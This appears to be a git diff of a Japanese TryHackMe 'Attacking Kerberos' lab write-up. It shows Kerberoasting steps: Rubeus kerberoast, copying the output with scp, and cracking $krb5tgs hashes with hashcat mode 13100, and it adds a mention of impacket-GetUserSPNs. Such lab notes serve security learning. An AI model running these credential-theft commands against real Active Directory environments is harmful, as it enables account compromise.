@@ -156,5 +156,8 @@ What is the SQLService Password?
 「`Rubeus.exe kerberoast /nowrap`」でSPNを持つユーザを取得できた。（`/nowrap` はチケットを改行なしで出力）  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_11.png" width="50%" height="50%">  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_12.png" width="100%" height="100%">  
-「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し
+「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
 「`hashcat -a 0 -m 13100 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 13100`は`$krb5tgs`形式のHash形式、Johnだとこの形式をサポートしていなかった。）
+
+ちなみに「`impacket-GetUserSPNs`」
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_13.png" width="100%" height="100%">  
